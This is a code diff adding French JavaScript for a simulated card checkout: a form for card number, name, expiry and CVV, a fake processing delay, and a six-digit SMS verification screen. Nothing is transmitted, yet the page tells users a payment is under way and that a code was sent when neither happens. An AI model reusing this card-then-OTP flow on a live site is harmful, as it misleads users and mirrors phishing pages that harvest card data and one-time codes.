@@ -597,3 +597,108 @@ function showPage(pageId) {
     updateNotificationBadge();
   }
 }
+
+// Ajoutez ces fonctions à votre fichier script.js
+
+function processPayment(programName, amount) {
+  const cardNumber = document.getElementById('card-number').value;
+  const cardName = document.getElementById('card-name').value;
+  const expiryDate = document.getElementById('expiry-date').value;
+  const cvv = document.getElementById('cvv').value;
+  
+  // Validation
+  if (!cardNumber || !cardName || !expiryDate || !cvv) {
+    alert('Veuillez remplir tous les champs obligatoires');
+    return;
+  }
+  
+  // Afficher le loading
+  showPaymentLoading(programName, amount);
+  
+  // Simuler l'envoi des données et la réception du code
+  setTimeout(() => {
+    showVerificationForm(programName, amount);
+  }, 4000);
+}
+
+function showPaymentLoading(programName, amount) {
+  document.getElementById('payment-page').innerHTML = `
+    <div class="payment-container">
+      <div class="payment-loading">
+        <i class="fas fa-spinner"></i>
+        <h2>Traitement de votre paiement</h2>
+        <p>Veuillez patienter pendant que nous traitons votre paiement de ${amount} € pour ${programName}...</p>
+      </div>
+    </div>
+  `;
+}
+
+function showVerificationForm(programName, amount) {
+  document.getElementById('payment-page').innerHTML = `
+    <div class="payment-container">
+      <div class="verification-card">
+        <h2><i class="fas fa-mobile-alt"></i> Vérification en 2 étapes</h2>
+        <p>Nous avons envoyé un code de vérification à votre numéro de téléphone enregistré.</p>
+        
+        <div class="verification-inputs">
+          <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
+          <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
+          <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
+          <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
+          <input type="text" maxlength="1" oninput="moveToNext(this, 5)">
+          <input type="text" maxlength="1" oninput="verifyCode(this)">
+        </div>
+        
+        <p class="verification-note">
+          Entrez le code à 6 chiffres reçu par SMS
+        </p>
+        
+        <button class="payment-btn" onclick="completePayment('${programName}', ${amount})">
+          <i class="fas fa-check-circle"></i> Valider
+        </button>
+        
+        <p style="margin-top: 1rem;">
+          Vous n'avez pas reçu de code ? <span class="resend-code" onclick="resendCode()">Renvoyer le code</span>
+        </p>
+      </div>
+    </div>
+  `;
+}
+
+function moveToNext(input, nextIndex) {
+  if (input.value.length === 1) {
+    const nextInput = input.parentElement.querySelector(`input:nth-child(${nextIndex + 1})`);
+    if (nextInput) {
+      nextInput.focus();
+    }
+  }
+}
+
+function verifyCode(input) {
+  if (input.value.length === 1) {
+    // Vous pouvez ajouter ici la logique pour vérifier immédiatement le code
+    // au lieu d'attendre le clic sur le bouton Valider
+  }
+}
+
+function resendCode() {
+  alert("Un nouveau code a été envoyé à votre numéro de téléphone.");
+  // Ici vous pourriez implémenter la logique pour renvoyer réellement le code
+}
+
+function completePayment(programName, amount) {
+  const codeInputs = document.querySelectorAll('.verification-inputs input');
+  let verificationCode = '';
+  
+  codeInputs.forEach(input => {
+    verificationCode += input.value;
+  });
+  
+  if (verificationCode.length !== 6) {
+    alert('Veuillez entrer un code de vérification complet (6 chiffres)');
+    return;
+  }
+  
+  // Simuler la vérification du code
+  showPaymentSuccess(programName, amount);
+}
